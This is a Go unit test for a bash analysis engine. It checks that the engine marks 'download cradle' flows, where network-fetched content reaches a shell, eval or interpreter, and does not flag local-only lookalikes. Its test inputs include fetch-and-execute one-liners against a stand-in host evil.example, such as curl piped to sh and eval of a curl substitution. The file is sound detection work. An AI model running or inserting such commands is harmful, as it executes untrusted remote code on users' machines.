package bash_test

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/front/bash"
)

// hasCradle reports whether the result carries a CodeExec sink marked as reached
// by network content.
func hasCradle(res *bash.ExecResult) bool {
	for _, e := range res.Effects {
		if e.NetFlow == engine.FlowCradle {
			return e.Kind == engine.KindCodeExec
		}
	}
	return false
}

// TestExecCradleMarking pins the frontend half of the download-cradle flow: a
// code-execution sink fed by network content is marked FlowCradle, and a sink
// that consumes only local data is not. The flow is established from the
// pipeline's value flow and from the provenance of the sink's arguments (a
// command substitution whose body fetched over the network), not from the mere
// co-occurrence of an egress and a sink.
func TestExecCradleMarking(t *testing.T) {
	r := newResolver(t)
	cases := []struct {
		src  string
		want bool
	}{
		{`curl -sL https://evil.example/x | sh`, true},
		{`curl -sL https://evil.example/x | bash`, true},
		{`curl -sL https://evil.example/x | python3`, true},
		{`sh -c "$(curl -s https://evil.example/x)"`, true},
		{`bash <(curl -s https://evil.example/x)`, true},
		{`eval "$(curl -s https://evil.example/x)"`, true},
		{`curl -sL https://evil.example/x | head`, false}, // no code-execution sink
		{`echo hi | sh`, false},                           // local producer, no network
		{`sh -c "echo hi"`, false},                        // literal argument, no network
		{`curl -sL https://evil.example/x`, false},        // egress alone: not a flow
		// A substitution is untrusted whatever it ran: only a body that actually
		// fetched over the network makes the sink a cradle (code review #4).
		{`sh -c "$(cat local.txt)"`, false},                                       // local file read, not network content
		{`eval "$(echo a)"`, false},                                               // local producer, not network content
		{`sh -c "$(wc -l < f)"`, false},                                           // local redirection, not network content
		{`bash <(cat local.txt)`, false},                                          // process substitution, local body
		{`source <(echo 'echo hi')`, false},                                       // process substitution, local body
		{`read x; sh -c "$x"`, false},                                             // stdin is untrusted, not network content
		{`curl -sL https://evil.example/x; sh -c "$(cat /tmp/local.txt)"`, false}, // co-occurrence
		// A value the network produced and a later sink consumes is a flow.
		{`x=$(curl -s https://evil.example/x); sh -c "$x"`, true},
		// The flow must survive an intermediate stage that only passes the bytes
		// on (code review #6).
		{`curl -sL https://evil.example/x | tee /tmp/f | sh`, true},
		{`curl -sL https://evil.example/x | cat | sh`, true},
		{`curl -sL https://evil.example/x | grep foo | sh`, true},
		{`curl -sL https://evil.example/x | tr a b | bash`, true},
		{`curl -sL https://evil.example/x | base64 -d | sh`, true},
		{`curl -sL https://evil.example/x | cat | head`, false}, // still no sink
		// A path-qualified interpreter is the same sink as its basename, and env
		// execs the interpreter it names (code review #55).
		{`curl -s http://e/x | /bin/sh`, true},
		{`curl -s http://e/x | /usr/bin/env bash`, true},
		{`curl -s http://e/x | /usr/bin/env -i bash`, true},
		{`curl -s http://e/x | env sh`, true},
		{`curl -s http://e/x | /usr/bin/env dirname`, false}, // env runs no sink
		{`curl -s http://e/x | /bin/cat`, false},             // path-qualified non-sink
	}
	for _, tc := range cases {
		res := bash.ExecBash(tc.src, r)
		if got := hasCradle(res); got != tc.want {
			t.Errorf("%q: cradle=%v, want %v (effects=%v)", tc.src, got, tc.want, effectKeys(res))
		}
	}
}
